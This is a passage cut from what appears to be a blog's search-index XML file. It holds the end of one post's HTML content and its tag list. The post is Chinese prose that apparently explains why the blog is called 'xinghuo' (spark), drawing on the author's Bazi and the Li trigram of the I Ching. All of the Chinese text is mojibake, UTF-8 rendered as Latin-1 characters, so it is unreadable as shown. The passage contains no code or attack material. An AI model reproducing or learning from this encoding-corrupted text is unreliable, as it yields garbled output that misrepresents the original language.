æ›´å¤šçš„çŸ¥è¯†æ¥å¡«è¡¥ä¸­ç©ºï¼Œåˆæƒ³åˆ°è‡ªå·±å…«å­—ç¼ºç«ï¼Œä¸”æœ¨è¿‡æ—ºï¼Œè§‰ç€ç¡®å®ä¸é”™ï¼Œäºæ˜¯å€Ÿç”¨â€œç¦»è€…ï¼Œä¸½ä¹Ÿâ€ï¼Œå…ˆç»™è‡ªå·±å®šä¸‹ä¸€ä¸ªç›®æ ‡ã€‚å†è€…ï¼Œä¸€åˆ‡éƒ½å¤„äºåˆå§‹ï¼Œäºæ˜¯ä¾¿ç”¨ç¦»å¦çš„åˆçˆ»çˆ»è¾â€”â€”â€œå±¥é”™ç„¶ï¼Œæ•¬ä¹‹æ— å’â€ï¼Œæ¥è­¦æˆ’è‡ªå·±ã€‚</p><p>å†åæ¥ï¼Œâ€œæ˜Ÿç«â€ä¸€è¯çªç„¶è·ƒè¿›äºè„‘ä¸­ï¼Œæƒ³æ¥ä¹Ÿæ˜¯æ— æ¯”åˆé€‚ã€‚æ˜Ÿæ˜Ÿä¹‹ç«ï¼Œå¯ä»¥ç‡åŸï¼Œç»ˆå¾—ä¸½ä¹‹è±¡ã€‚â€œæ˜Ÿç«â€äº¦æœ‰ç¹æ˜Ÿä¹‹æ„ï¼Œä¹Ÿæ„å‘³ç€æˆ‘æ‰€æ¢æ±‚çš„é¢†åŸŸï¼Œæ‹¥æœ‰ç»šçƒ‚è€Œä¸°å¯Œçš„åº•è•´ã€‚</p><p>æœ€åï¼Œåˆå¯»å¾—ä¸€å¼ å¾ˆç¬¦åˆâ€œæ˜Ÿç«â€ä¸ç¦»å¦çš„èƒŒæ™¯ï¼Œä¹Ÿç®—æ˜¯å®Œæˆäº†æ•´ä¸ªåšå®¢çš„æ­å»ºã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>åº</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
